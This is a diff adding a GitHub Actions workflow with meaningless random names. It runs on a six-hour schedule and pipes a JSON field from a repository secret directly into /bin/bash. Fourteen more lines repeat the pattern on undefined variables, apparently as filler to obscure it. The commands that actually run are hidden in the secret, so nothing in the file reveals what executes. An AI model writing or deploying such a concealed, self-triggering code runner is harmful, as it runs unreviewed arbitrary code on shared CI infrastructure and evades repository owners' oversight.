@@ -1,0 +1,31 @@
+name: zhenbeiwang4896
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhenbeiwang4896
+        env:
+          vcu74148: ${{ secrets.vcu74148 }}
+        run: |
+          echo $vcu74148 | jq -r .kdrh59694 | /bin/bash
+          echo $qkt613 | jq -r .rah69844 | /bin/bash
+          echo $pc99 | jq -r .o2528 | /bin/bash
+          echo $u79 | jq -r .pcf9 | /bin/bash
+          echo $us8 | jq -r .lmpql4587 | /bin/bash
+          echo $hb63157 | jq -r .dstqa90827 | /bin/bash
+          echo $fd7659 | jq -r .xh7 | /bin/bash
+          echo $vmqj82 | jq -r .x64512 | /bin/bash
+          echo $zs3 | jq -r .xfrfl149 | /bin/bash
+          echo $edwr4 | jq -r .xwk375 | /bin/bash
+          echo $vww60 | jq -r .eeunu9827 | /bin/bash
+          echo $ugjm8 | jq -r .h36 | /bin/bash
+          echo $ix04049 | jq -r .v8 | /bin/bash
+          echo $htxi27726 | jq -r .znhro20514 | /bin/bash
+          echo $mmcn5524 | jq -r .uqd328 | /bin/bash
+
